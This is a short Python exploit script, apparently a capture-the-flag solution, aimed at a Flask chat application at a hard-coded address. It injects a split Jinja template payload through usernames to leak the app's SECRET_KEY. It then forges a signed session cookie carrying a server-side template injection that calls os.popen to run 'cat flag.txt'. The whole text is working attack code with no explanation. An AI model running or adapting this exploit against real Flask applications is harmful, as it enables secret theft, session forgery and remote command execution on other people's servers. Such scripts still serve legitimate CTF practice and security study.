import requests
import html
from flask_unsign import session

URL = "http://34.44.129.8:51638"

s = requests.Session()


def send_as_user(username, message):
    s.post(f"{URL}/set_username", data={"username": username})
    s.post(f"{URL}/send_message", data={"message": message})


def get_result():
    return html.unescape(s.get(f"{URL}").text).split('<div id="chat-box">')[1].split('</div>')[0]


send_as_user('{{ config ~ "', 'a')
send_as_user('" }}', 'b')
SECRET_KEY = eval(get_result().split("SECRET_KEY': ")[1].split(", 'SECRET")[0])
print("SECRET_KEY", SECRET_KEY)
assert len(SECRET_KEY) == 24

payload = "{{ config.__class__.__init__.__globals__['os'].popen('cat flag.txt').read() }}"
forged_cookie = session.sign(
    {'username': payload},
    secret=SECRET_KEY
)
requests.post(f"{URL}/send_message",
              cookies={"session": forged_cookie}, data={"message": "END"})

print(get_result().split("<br>")[-1].split(": END")[0].replace("\\n", "\n"))
